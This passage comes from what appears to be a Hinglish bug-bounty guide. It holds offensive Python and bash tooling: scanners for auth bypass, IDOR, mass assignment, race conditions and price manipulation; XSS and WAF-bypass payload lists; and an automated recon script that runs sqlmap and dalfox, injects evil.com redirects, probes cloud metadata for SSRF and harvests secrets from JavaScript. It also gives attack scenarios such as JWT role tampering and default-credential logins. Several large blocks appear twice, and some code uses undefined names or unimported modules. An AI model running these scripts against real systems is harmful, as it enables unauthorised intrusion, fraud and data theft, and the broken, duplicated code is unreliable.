        self.vulnerabilities = []
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        # Check common API paths
        common_paths = [
            '/api/v1/', '/api/v2/', '/rest/', '/graphql',
            '/swagger.json', '/openapi.json', '/.well-known/'
        ]
        
        for path in common_paths:
            response = requests.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                self.endpoints.append(path)
    
    def test_authentication_bypass(self):
        """Test for authentication bypass"""
        bypass_techniques = [
            {'header': 'X-Forwarded-For', 'value': '127.0.0.1'},
            {'header': 'X-Real-IP', 'value': '127.0.0.1'},
            {'header': 'X-Originating-IP', 'value': '127.0.0.1'},
            {'header': 'X-Remote-IP', 'value': '127.0.0.1'}
        ]
        
        for technique in bypass_techniques:
            headers = {technique['header']: technique['value']}
            response = requests.get(f"{self.base_url}/admin", headers=headers)
            if response.status_code == 200:
                self.vulnerabilities.append(f"Auth bypass via {technique['header']}")
    
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        # Test sequential IDs
        for user_id in range(1, 100):
            response = requests.get(
                f"{self.base_url}/api/users/{user_id}",
                headers={'Authorization': f'Bearer {self.auth_token}'}
            )
            if response.status_code == 200:
                # Check if we can access other users' data
                data = response.json()
                if data.get('user_id') != self.current_user_id:
                    self.vulnerabilities.append(f"IDOR at /api/users/{user_id}")
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        # Try to add admin fields
        payload = {
            'name': 'Test User',
            'email': 'test@example.com',
            'role': 'admin',  # Attempt privilege escalation
            'is_admin': True,
            'permissions': ['read', 'write', 'delete']
        }
        
        response = requests.post(
            f"{self.base_url}/api/users",
            json=payload,
            headers={'Authorization': f'Bearer {self.auth_token}'}
        )
        
        if response.status_code == 201:
            user_data = response.json()
            if user_data.get('role') == 'admin':
                self.vulnerabilities.append("Mass assignment - privilege escalation")
```

#### Methodology 2: Business Logic Testing
```python
#!/usr/bin/env python3
"""
Business Logic Vulnerability Testing Framework
"""

class BusinessLogicTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_workflow_bypass(self):
        """Test workflow bypass vulnerabilities"""
        # Normal workflow: register -> verify -> activate
        # Try to skip verification step
        
        # Step 1: Register user
        register_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password': 'password123'
        }
        register_response = self.session.post(f"{self.target_url}/register", data=register_data)
        
        # Step 2: Try to activate without verification
        if 'user_id' in register_response.text:
            user_id = self.extract_user_id(register_response.text)
            activate_response = self.session.get(f"{self.target_url}/activate/{user_id}")
            
            if activate_response.status_code == 200:
                self.vulnerabilities.append("Workflow bypass - email verification skipped")
    
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        # Test concurrent money transfers
        def transfer_money():
            return self.session.post(f"{self.target_url}/transfer", data={
                'from_account': '123',
                'to_account': '456',
                'amount': '1000'
            })
        
        # Execute multiple transfers simultaneously
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(transfer_money) for _ in range(10)]
            results = [future.result() for future in futures]
        
        # Check if multiple transfers were processed
        successful_transfers = sum(1 for r in results if r.status_code == 200)
        if successful_transfers > 1:
            self.vulnerabilities.append("Race condition in money transfer")
    
    def test_price_manipulation(self):
        """Test price manipulation vulnerabilities"""
        # Test negative prices
        negative_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '-100'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=negative_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - negative prices accepted")
        
        # Test zero prices
        zero_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '0'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=zero_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - zero prices accepted")
```

#### Methodology 3: Advanced XSS Testing
```python
#!/usr/bin/env python3
"""
Advanced XSS Testing with Context Awareness
"""

class AdvancedXSSTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = self.load_context_payloads()
        self.vulnerabilities = []
    
    def load_context_payloads(self):
        """Load context-specific XSS payloads"""
        return {
            'html_context': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'attribute_context': [
                '" onmouseover="alert(\'XSS\')" "',
                '\' onmouseover=\'alert("XSS")\' \'',
                'javascript:alert("XSS")',
                '" autofocus onfocus="alert(\'XSS\')" "'
            ],
            'javascript_context': [
                '\';alert("XSS");//',
                '\";alert("XSS");//',
                '</script><script>alert("XSS")</script>',
                'eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))'
            ],
            'css_context': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                '/**/expression(alert("XSS"))',
                'behavior:url(#default#userData)'
            ]
        }
    
    def detect_context(self, response_text, payload):
        """Detect the context where payload is reflected"""
        if f'<script>{payload}</script>' in response_text:
            return 'html_context'
        elif f'value="{payload}"' in response_text:
            return 'attribute_context'
        elif f'var data = "{payload}";' in response_text:
            return 'javascript_context'
        elif f'color: {payload};' in response_text:
            return 'css_context'
        return 'unknown_context'
    
    def test_xss_with_context(self, parameter):
        """Test XSS with context-aware payloads"""
        # First, detect the context
        test_payload = "CONTEXT_TEST_12345"
        response = requests.get(f"{self.target_url}?{parameter}={test_payload}")
        context = self.detect_context(response.text, test_payload)
        
        # Use appropriate payloads for detected context
        if context in self.payloads:
            for payload in self.payloads[context]:
                test_response = requests.get(f"{self.target_url}?{parameter}={payload}")
                if self.is_xss_successful(test_response.text, payload):
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'context': context,
                        'parameter': parameter,
                        'payload': payload
                    })
    
    def test_waf_bypass(self, parameter):
        """Test WAF bypass techniques"""
        waf_bypass_payloads = [
            '<ScRiPt>alert("XSS")</ScRiPt>',  # Case variation
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',  # Encoding
            '<svg/onload=alert("XSS")>',  # Tag variation
            '<img src=x onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',  # Base64 encoding
            '"><script>alert("XSS")</script>',  # Context breaking
            '<iframe srcdoc="<script>parent.alert(\'XSS\')</script>">',  # Iframe technique
        ]
        
        for payload in waf_bypass_payloads:
            response = requests.get(f"{self.target_url}?{parameter}={payload}")
            if self.is_xss_successful(response.text, payload):
                self.vulnerabilities.append({
                    'type': 'XSS_WAF_BYPASS',
                    'parameter': parameter,
                    'payload': payload
                })
```

### Practical Bug Hunting Scripts

#### Complete Automation Script
```bash
#!/bin/bash
# complete_bug_hunt.sh - Full automation script

domain=$1
if [ -z "$domain" ]; then
    echo "Usage: $0 domain.com"
    exit 1
fi

echo "[+] Starting comprehensive bug hunting for $domain"

# Create directory structure
mkdir -p $domain/{recon,vulns,reports}
cd $domain

# Phase 1: Subdomain Discovery
echo "[+] Phase 1: Subdomain Discovery"
subfinder -d $domain -all -silent | tee recon/subs.txt
assetfinder --subs-only $domain | anew recon/subs.txt
amass enum -passive -d $domain | anew recon/subs.txt
echo "[+] Found $(cat recon/subs.txt | wc -l) subdomains"

# Phase 2: Live Host Detection
echo "[+] Phase 2: Live Host Detection"
cat recon/subs.txt | httpx -silent -status-code -title | tee recon/alive.txt
cat recon/alive.txt | cut -d' ' -f1 > recon/alive_urls.txt
echo "[+] Found $(cat recon/alive_urls.txt | wc -l) live hosts"

# Phase 3: URL Discovery
echo "[+] Phase 3: URL Discovery"
cat recon/alive_urls.txt | waybackurls | anew recon/all_urls.txt
cat recon/alive_urls.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf | anew recon/all_urls.txt
cat recon/alive_urls.txt | katana -silent -d 3 | anew recon/all_urls.txt
echo "[+] Found $(cat recon/all_urls.txt | wc -l) URLs"

# Phase 4: Parameter Discovery
echo "[+] Phase 4: Parameter Discovery"
cat recon/all_urls.txt | grep "=" | anew recon/params.txt
echo "[+] Found $(cat recon/params.txt | wc -l) parameterized URLs"

# Phase 5: Vulnerability Testing
echo "[+] Phase 5: Vulnerability Testing"

# XSS Testing
echo "[+] Testing for XSS"
cat recon/params.txt | dalfox pipe --silence --no-spinner --skip-bav -o vulns/xss_results.txt

# SQL Injection Testing
echo "[+] Testing for SQL Injection"
sqlmap -m recon/params.txt --batch --level=2 --risk=2 --random-agent --output-dir=vulns/sqli/

# Open Redirect Testing
echo "[+] Testing for Open Redirect"
cat recon/params.txt | qsreplace "https://evil.com" | httpx -fr -silent | grep evil.com > vulns/open_redirect.txt

# SSRF Testing
echo "[+] Testing for SSRF"
cat recon/params.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent | grep -E "(instance-id|ami-id)" > vulns/ssrf.txt

# Phase 6: JavaScript Analysis
echo "[+] Phase 6: JavaScript Analysis"
cat recon/all_urls.txt | grep "\.js" | httpx -silent | tee recon/js_files.txt
cat recon/js_files.txt | xargs -n 1 -I % bash -c 'echo % && curl -s % | grep -E "(api_key|token|secret|bearer|Authorization|apikey)="' > vulns/js_secrets.txt

# Phase 7: Directory Fuzzing
echo "[+] Phase 7: Directory Fuzzing"
cat recon/alive_urls.txt | head -10 | xargs -n 1 -I % gobuster dir -u % -w ~/wordlists/common.txt -q -o vulns/dirs_%.txt

# Phase 8: Technology Detection
echo "[+] Phase 8: Technology Detection"
cat recon/alive_urls.txt | head -5 | xargs -n 1 whatweb > recon/tech_stack.txt

# Generate Report
echo "[+] Generating Report"
cat > reports/summary.txt << EOF
Bug Hunting Report for $domain
Generated on: $(date)

=== RECONNAISSANCE SUMMARY ===
Subdomains found: $(cat recon/subs.txt | wc -l)
Live hosts: $(cat recon/alive_urls.txt | wc -l)
URLs discovered: $(cat recon/all_urls.txt | wc -l)
Parameterized URLs: $(cat recon/params.txt | wc -l)
JavaScript files: $(cat recon/js_files.txt | wc -l)

=== VULNERABILITY SUMMARY ===
XSS findings: $(cat vulns/xss_results.txt 2>/dev/null | wc -l)
Open Redirects: $(cat vulns/open_redirect.txt 2>/dev/null | wc -l)
SSRF findings: $(cat vulns/ssrf.txt 2>/dev/null | wc -l)
JS Secrets: $(cat vulns/js_secrets.txt 2>/dev/null | wc -l)

=== NEXT STEPS ===
1. Manual verification of automated findings
2. Business logic testing
3. Authentication bypass testing
4. IDOR testing on discovered endpoints
5. Deep dive into interesting subdomains

EOF

echo "[+] Bug hunting completed! Check reports/summary.txt for overview"
echo "[+] All data saved in $domain/ directory"
```

#### Continuous Monitoring Script
```python
#!/usr/bin/env python3
"""
Continuous Bug Hunting Monitor
Monitors targets for new subdomains and vulnerabilities
"""

import subprocess
import time
import json
import smtplib
from email.mime.text import MIMEText
from datetime import datetime

class BugHuntMonitor:
    def __init__(self, targets_file, notification_email=None):
        self.targets_file = targets_file
        self.notification_email = notification_email
        self.previous_results = {}
        self.load_previous_results()
    
    def load_previous_results(self):
        """Load previous scan results"""
        try:
            with open('previous_results.json', 'r') as f:
                self.previous_results = json.load(f)
        except FileNotFoundError:
            self.previous_results = {}
    
    def save_results(self, results):
        """Save current results"""
        with open('previous_results.json', 'w') as f:
            json.dump(results, f, indent=2)
    
    def scan_target(self, domain):
        """Scan a single target"""
        print(f"[+] Scanning {domain}")
        
        # Subdomain discovery
        cmd = f"subfinder -d {domain} -all -silent"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)
        subdomains = set(result.stdout.strip().split('\n'))
        
        # Live host detection
        live_hosts = set()
        for subdomain in subdomains:
            if subdomain:
                cmd = f"httpx -silent -status-code"
                process = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE, text=True)
                output, _ = process.communicate(input=subdomain)
                if output.strip():
                    live_hosts.add(subdomain)
        
        return {
            'subdomains': subdomains,
            'live_hosts': live_hosts,
            'scan_time': datetime.now().isoformat()
        }
    
    def compare_results(self, domain, current_results):
        """Compare current results with previous scans"""
        # Implementation for comparison logic
        pass
    
    def send_notification(self, domain, changes):
        """Send email notification for changes"""
        if not self.notification_email or not any(changes.values()):
            return
        
        subject = f"New findings for {domain}"
        body = f"""
        New Bug Hunting Findings for {domain}
        
        New Subdomains ({len(changes['new_subdomains'])}):
        {chr(10).join(changes['new_subdomains'])}
        
        New Live Hosts ({len(changes['new_live_hosts'])}):
        {chr(10).join(changes['new_live_hosts'])}
        
        Scan Time: {datetime.now()}
        """
        
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = 'bugbounty@monitor.com'
        msg['To'] = self.notification_email
        
        # Configure SMTP settings
        try:
            server = smtplib.SMTP('localhost')
            server.send_message(msg)
            server.quit()
            print(f"[+] Notification sent for {domain}")
        except Exception as e:
            print(f"[-] Failed to send notification: {e}")
    
    def run_continuous_monitoring(self, interval_hours=24):
        """Run continuous monitoring"""
        with open(self.targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
        
        while True:
            print(f"[+] Starting monitoring cycle at {datetime.now()}")
            current_results = {}
            
            for domain in targets:
                try:
                    results = self.scan_target(domain)
                    changes = self.compare_results(domain, results)
                    
                    if changes['new_subdomains'] or changes['new_live_hosts']:
                        print(f"[!] New findings for {domain}:")
                        print(f"    New subdomains: {len(changes['new_subdomains'])}")
                        print(f"    New live hosts: {len(changes['new_live_hosts'])}")
                        self.send_notification(domain, changes)
                    
                    current_results[domain] = {
                        'subdomains': list(results['subdomains']),
                        'live_hosts': list(results['live_hosts']),
                        'scan_time': results['scan_time']
                    }
                    
                except Exception as e:
                    print(f"[-] Error scanning {domain}: {e}")
            
            self.previous_results.update(current_results)
            self.save_results(self.previous_results)
            
            print(f"[+] Monitoring cycle completed. Sleeping for {interval_hours} hours...")
            time.sleep(interval_hours * 3600)

if __name__ == "__main__":
    monitor = BugHuntMonitor('targets.txt', 'your-email@example.com')
    monitor.run_continuous_monitoring(24)  # Check every 24 hours
```

### Advanced Checklist:
- [ ] 0-day vulnerabilities discover kar sakte ho
- [ ] Advanced attack vectors master ho
- [ ] Custom frameworks develop kar sakte ho
- [ ] Research papers publish kiye
- [ ] Conference presentations diye
- [ ] Industry recognition mila

---

## 🛠️ Tools Arsenal

### Reconnaissance Tools
```bash
# Subdomain Enumeration
subfinder, assetfinder, amass, findomain, chaos

# URL Discovery
katana, waybackurls, gau, hakrawler

# Port Scanning
nmap, masscan, rustscan

# Technology Detection
whatweb, wappalyzer, builtwith
```

### Vulnerability Scanners
```bash
# Web Application
burp suite, owasp zap, nikto, w3af

# Specific Vulnerabilities
dalfox (XSS), sqlmap (SQLi), commix (Command Injection)

# Network
nessus, openvas, nuclei
```

### Custom Scripts Location
```bash
~/bugbounty/tools/
├── recon.sh
├── vuln_scan.sh
├── js_analysis.py
├── subdomain_monitor.py
└── report_generator.py
```

### Complete Tools Arsenal (Enhanced)

#### Reconnaissance & OSINT
```bash
# Subdomain Discovery
subfinder -d target.com -all -silent
assetfinder --subs-only target.com
amass enum -passive -d target.com
findomain -t target.com -q
chaos -d target.com -key API_KEY

# DNS Tools
dnsrecon -d target.com -t std
fierce -dns target.com
dnscan -d target.com -w wordlist.txt

# Certificate Transparency
crt.sh, censys.io, shodan.io
certspotter -domain target.com

# Social Media & Email OSINT
sherlock username
theHarvester -d target.com -l 500 -b all
hunter.io, clearbit.com, pipl.com

# GitHub & Code Search
github-search.py -s "target.com"
truffleHog --regex --entropy=False target_repo
gitleaks --repo=target_repo

# Shodan & Internet Scanning
shodan search "ssl:target.com"
censys search "target.com"
zoomeye.org, fofa.so
```

#### Web Application Testing
```bash
# Directory & File Discovery
gobuster dir -u https://target.com -w wordlist.txt
dirsearch -u https://target.com -e php,html,js
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Parameter Discovery
paramspider -d target.com
arjun -u https://target.com/page
x8 -u "https://target.com/page" -w wordlist.txt

# Content Discovery
waybackurls target.com
gau target.com
hakrawler -url https://target.com -depth 3

# Technology Stack Detection
whatweb target.com
wappalyzer target.com
builtwith.com
retire.js (for JS libraries)

# WAF Detection
wafw00f target.com
nmap --script http-waf-detect target.com
```

#### Vulnerability Scanners
```bash
# Web Application Scanners
burp suite professional
owasp zap
acunetix, netsparker
w3af -p scan_profile

# Specific Vulnerability Tools
# XSS
dalfox url https://target.com/page?param=value
xsser -u "https://target.com/page?param=value"
xsstrike -u https://target.com/page

# SQL Injection
sqlmap -u "https://target.com/page?id=1" --batch
jSQL injection tool
NoSQLMap (for NoSQL injection)

# SSRF
ssrfmap -r request.txt
gopherus (for SSRF exploitation)

# XXE
xxeinjector -r request.txt
oxml_xxe (for Office documents)

# Command Injection
commix -u "https://target.com/page?cmd=value"

# LDAP Injection
ldapdomaindump -u username -p password target.com

# Template Injection
tplmap -u "https://target.com/page?template=value"
```

#### Network & Infrastructure
```bash
# Port Scanning
nmap -sS -sV -O -A target.com
masscan -p1-65535 target.com --rate=1000
rustscan -a target.com -- -A

# Service Enumeration
nmap --script vuln target.com
nmap --script discovery target.com
enum4linux target.com (for SMB)

# SSL/TLS Testing
sslscan target.com
sslyze target.com
testssl.sh target.com

# Network Vulnerability Scanners
nessus, openvas, nexpose
nuclei -t nuclei-templates/ -u https://target.com
```

#### Mobile Application Testing
```bash
# Android
jadx app.apk (decompile)
apktool d app.apk (disassemble)
dex2jar app.apk (convert to jar)
mobsf (mobile security framework)

# iOS
class-dump binary
otool -L binary
hopper disassembler
frida (dynamic analysis)

# Static Analysis
semgrep --config=auto source_code/
bandit -r python_code/
brakeman rails_app/
```

#### Cloud Security Testing
```bash
# AWS
aws s3 ls s3://bucket-name --no-sign-request
aws iam get-account-authorization-details
pacu (AWS exploitation framework)
scout suite (multi-cloud auditing)

# Azure
az account list
az vm list
stormspotter (Azure red team tool)

# Google Cloud
gcloud projects list
gcloud compute instances list
gcpbucketbrute bucket_name
```

#### API Testing
```bash
# REST API
postman, insomnia
burp suite (with API testing extensions)
ffuf -u https://api.target.com/FUZZ -w api_wordlist.txt

# GraphQL
graphql-voyager (schema visualization)
graphiql (query interface)
graphql-cop (security scanner)

# API Discovery
kiterunner -A=apiroutes-210228 -t https://target.com
gobuster dir -u https://target.com/api -w api_wordlist.txt
```

### Real-World Scenarios & Case Studies

#### Scenario 1: E-commerce Application Testing
```bash
# Target: Online shopping platform
# Scope: *.shop.com

# Phase 1: Reconnaissance
subfinder -d shop.com -all -silent | tee subs.txt
cat subs.txt | httpx -silent -status-code -title | tee alive.txt

# Phase 2: Technology Detection
whatweb shop.com
# Result: WordPress, WooCommerce, MySQL

# Phase 3: Vulnerability Testing
# Business Logic: Price manipulation
# Original request: {"item_id": 123, "quantity": 1, "price": 100}
# Attack: {"item_id": 123, "quantity": -1, "price": 100}
# Result: Negative quantity gives money back

# IDOR Testing
# Original: /api/orders/12345 (your order)
# Attack: /api/orders/12346 (someone else's order)
# Result: Access to other users' orders

# Payment Bypass
# Normal flow: cart -> checkout -> payment -> success
# Attack: cart -> checkout -> success (skip payment)
# Result: Free items
```

#### Scenario 2: SaaS Platform Testing
```bash
# Target: Project management SaaS
# Scope: *.projectmanager.com

# Phase 1: Subdomain Discovery
amass enum -passive -d projectmanager.com | tee subs.txt
# Found: api.projectmanager.com, admin.projectmanager.com

# Phase 2: API Testing
# JWT Token Analysis
echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..." | base64 -d
# Found: {"user_id": 123, "role": "user", "exp": 1234567890}

# Privilege Escalation
# Change role from "user" to "admin" in JWT
# Result: Admin access to all projects

# Mass Assignment
# Original: {"name": "Project Name", "description": "Desc"}
# Attack: {"name": "Project Name", "description": "Desc", "owner_id": 1}
# Result: Change project ownership
```

#### Scenario 3: Banking Application Testing
```bash
# Target: Online banking platform
# Scope: *.bank.com (with explicit permission)

# Phase 1: Careful Reconnaissance
# Only passive techniques due to sensitive nature
curl -s "https://crt.sh/?q=bank.com&output=json" | jq -r '.[].name_value'

# Phase 2: Business Logic Testing
# Race Condition in Money Transfer
seq 1 10 | xargs -n1 -P10 -I{} curl -X POST "https://bank.com/transfer" \
  -d "from_account=123&to_account=456&amount=1000" \
  -H "Authorization: Bearer TOKEN"
# Result: Multiple transfers processed simultaneously

# Time-based Attacks
# Transfer $1000 at 23:59:59
# Cancel at 00:00:01 (next day)
# Result: Transfer processed but cancellation in new day fails
```

#### Scenario 4: IoT Device Testing
```bash
# Target: Smart home device
# IP: 192.168.1.100

# Phase 1: Network Discovery
nmap -sS -sV -O 192.168.1.100
# Found: Port 80 (HTTP), 22 (SSH), 23 (Telnet)

# Phase 2: Default Credentials
# Try: admin/admin, admin/password, root/root
telnet 192.168.1.100
# Success with admin/admin

# Phase 3: Firmware Analysis
binwalk firmware.bin
strings firmware.bin | grep -E "(password|key|secret)"
# Found hardcoded WiFi passwords and API keys

# Phase 4: Network Protocol Analysis
wireshark capture on device traffic
# Found: Unencrypted communication with cloud servers
```

### Advanced Testing Methodologies

#### Methodology 1: API Security Testing
```python
#!/usr/bin/env python3
"""
Comprehensive API Security Testing Framework
"""

class APISecurityTester:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.auth_token = auth_token
        self.endpoints = []
        self.vulnerabilities = []
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        # Check common API paths
        common_paths = [
            '/api/v1/', '/api/v2/', '/rest/', '/graphql',
            '/swagger.json', '/openapi.json', '/.well-known/'
        ]
        
        for path in common_paths:
            response = requests.get(f"{self.base_url}{path}")
            if response.status_code == 200:
                self.endpoints.append(path)
    
    def test_authentication_bypass(self):
        """Test for authentication bypass"""
        bypass_techniques = [
            {'header': 'X-Forwarded-For', 'value': '127.0.0.1'},
            {'header': 'X-Real-IP', 'value': '127.0.0.1'},
            {'header': 'X-Originating-IP', 'value': '127.0.0.1'},
            {'header': 'X-Remote-IP', 'value': '127.0.0.1'}
        ]
        
        for technique in bypass_techniques:
            headers = {technique['header']: technique['value']}
            response = requests.get(f"{self.base_url}/admin", headers=headers)
            if response.status_code == 200:
                self.vulnerabilities.append(f"Auth bypass via {technique['header']}")
    
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        # Test sequential IDs
        for user_id in range(1, 100):
            response = requests.get(
                f"{self.base_url}/api/users/{user_id}",
                headers={'Authorization': f'Bearer {self.auth_token}'}
            )
            if response.status_code == 200:
                # Check if we can access other users' data
                data = response.json()
                if data.get('user_id') != self.current_user_id:
                    self.vulnerabilities.append(f"IDOR at /api/users/{user_id}")
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        # Try to add admin fields
        payload = {
            'name': 'Test User',
            'email': 'test@example.com',
            'role': 'admin',  # Attempt privilege escalation
            'is_admin': True,
            'permissions': ['read', 'write', 'delete']
        }
        
        response = requests.post(
            f"{self.base_url}/api/users",
            json=payload,
            headers={'Authorization': f'Bearer {self.auth_token}'}
        )
        
        if response.status_code == 201:
            user_data = response.json()
            if user_data.get('role') == 'admin':
                self.vulnerabilities.append("Mass assignment - privilege escalation")
```

#### Methodology 2: Business Logic Testing
```python
#!/usr/bin/env python3
"""
Business Logic Vulnerability Testing Framework
"""

class BusinessLogicTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_workflow_bypass(self):
        """Test workflow bypass vulnerabilities"""
        # Normal workflow: register -> verify -> activate
        # Try to skip verification step
        
        # Step 1: Register user
        register_data = {
            'username': 'testuser',
            'email': 'test@example.com',
            'password': 'password123'
        }
        register_response = self.session.post(f"{self.target_url}/register", data=register_data)
        
        # Step 2: Try to activate without verification
        if 'user_id' in register_response.text:
            user_id = self.extract_user_id(register_response.text)
            activate_response = self.session.get(f"{self.target_url}/activate/{user_id}")
            
            if activate_response.status_code == 200:
                self.vulnerabilities.append("Workflow bypass - email verification skipped")
    
    def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        # Test concurrent money transfers
        def transfer_money():
            return self.session.post(f"{self.target_url}/transfer", data={
                'from_account': '123',
                'to_account': '456',
                'amount': '1000'
            })
        
        # Execute multiple transfers simultaneously
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(transfer_money) for _ in range(10)]
            results = [future.result() for future in futures]
        
        # Check if multiple transfers were processed
        successful_transfers = sum(1 for r in results if r.status_code == 200)
        if successful_transfers > 1:
            self.vulnerabilities.append("Race condition in money transfer")
    
    def test_price_manipulation(self):
        """Test price manipulation vulnerabilities"""
        # Test negative prices
        negative_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '-100'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=negative_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - negative prices accepted")
        
        # Test zero prices
        zero_price_payload = {
            'item_id': '123',
            'quantity': '1',
            'price': '0'
        }
        
        response = self.session.post(f"{self.target_url}/checkout", data=zero_price_payload)
        if 'success' in response.text.lower():
            self.vulnerabilities.append("Price manipulation - zero prices accepted")
```

#### Methodology 3: Advanced XSS Testing
```python
#!/usr/bin/env python3
"""
Advanced XSS Testing with Context Awareness
"""

class AdvancedXSSTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.payloads = self.load_context_payloads()
        self.vulnerabilities = []
    
    def load_context_payloads(self):
        """Load context-specific XSS payloads"""
        return {
            'html_context': [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src="javascript:alert(\'XSS\')"></iframe>'
            ],
            'attribute_context': [
                '" onmouseover="alert(\'XSS\')" "',
                '\' onmouseover=\'alert("XSS")\' \'',
                'javascript:alert("XSS")',
                '" autofocus onfocus="alert(\'XSS\')" "'
            ],
            'javascript_context': [
                '\';alert("XSS");//',
                '\";alert("XSS");//',
                '</script><script>alert("XSS")</script>',
                'eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))'
            ],
            'css_context': [
                'expression(alert("XSS"))',
                'url("javascript:alert(\'XSS\')")',
                '/**/expression(alert("XSS"))',
                'behavior:url(#default#userData)'
            ]
        }
    
    def detect_context(self, response_text, payload):
        """Detect the context where payload is reflected"""
        if f'<script>{payload}</script>' in response_text:
            return 'html_context'
        elif f'value="{payload}"' in response_text:
            return 'attribute_context'
        elif f'var data = "{payload}";' in response_text:
            return 'javascript_context'
        elif f'color: {payload};' in response_text:
            return 'css_context'
        return 'unknown_context'
    
    def test_xss_with_context(self, parameter):
        """Test XSS with context-aware payloads"""
        # First, detect the context
        test_payload = "CONTEXT_TEST_12345"
        response = requests.get(f"{self.target_url}?{parameter}={test_payload}")
        context = self.detect_context(response.text, test_payload)
        
        # Use appropriate payloads for detected context
        if context in self.payloads:
            for payload in self.payloads[context]:
                test_response = requests.get(f"{self.target_url}?{parameter}={payload}")
                if self.is_xss_successful(test_response.text, payload):
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'context': context,
                        'parameter': parameter,
                        'payload': payload
                    })
    
    def test_waf_bypass(self, parameter):
        """Test WAF bypass techniques"""
        waf_bypass_payloads = [
            '<ScRiPt>alert("XSS")</ScRiPt>',  # Case variation
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',  # Encoding
            '<svg/onload=alert("XSS")>',  # Tag variation
            '<img src=x onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',  # Base64 encoding
            '"><script>alert("XSS")</script>',  # Context breaking
            '<iframe srcdoc="<script>parent.alert(\'XSS\')</script>">',  # Iframe technique
        ]
        
        for payload in waf_bypass_payloads:
            response = requests.get(f"{self.target_url}?{parameter}={payload}")
            if self.is_xss_successful(response.text, payload):
                self.vulnerabilities.append({
                    'type': 'XSS_WAF_BYPASS',
                    'parameter': parameter,
                    'payload': payload
                })
```

### Practical Bug Hunting Scripts

#### Complete Automation Script
```bash
#!/bin/bash
# complete_bug_hunt.sh - Full automation script

domain=$1
if [ -z "$domain" ]; then
    echo "Usage: $0 domain.com"
    exit 1
fi

echo "[+] Starting comprehensive bug hunting for $domain"

# Create directory structure
mkdir -p $domain/{recon,vulns,reports}
cd $domain

# Phase 1: Subdomain Discovery
echo "[+] Phase 1: Subdomain Discovery"
subfinder -d $domain -all -silent | tee recon/subs.txt
assetfinder --subs-only $domain | anew recon/subs.txt
amass enum -passive -d $domain | anew recon/subs.txt
echo "[+] Found $(cat recon/subs.txt | wc -l) subdomains"

# Phase 2: Live Host Detection
echo "[+] Phase 2: Live Host Detection"
cat recon/subs.txt | httpx -silent -status-code -title | tee recon/alive.txt
cat recon/alive.txt | cut -d' ' -f1 > recon/alive_urls.txt
echo "[+] Found $(cat recon/alive_urls.txt | wc -l) live hosts"

# Phase 3: URL Discovery
echo "[+] Phase 3: URL Discovery"
cat recon/alive_urls.txt | waybackurls | anew recon/all_urls.txt
cat recon/alive_urls.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf | anew recon/all_urls.txt
cat recon/alive_urls.txt | katana -silent -d 3 | anew recon/all_urls.txt
echo "[+] Found $(cat recon/all_urls.txt | wc -l) URLs"

# Phase 4: Parameter Discovery
echo "[+] Phase 4: Parameter Discovery"
cat recon/all_urls.txt | grep "=" | anew recon/params.txt
echo "[+] Found $(cat recon/params.txt | wc -l) parameterized URLs"

# Phase 5: Vulnerability Testing
echo "[+] Phase 5: Vulnerability Testing"

# XSS Testing
echo "[+] Testing for XSS"
cat recon/params.txt | dalfox pipe --silence --no-spinner --skip-bav -o vulns/xss_results.txt

# SQL Injection Testing
echo "[+] Testing for SQL Injection"
sqlmap -m recon/params.txt --batch --level=2 --risk=2 --random-agent --output-dir=vulns/sqli/

# Open Redirect Testing
echo "[+] Testing for Open Redirect"
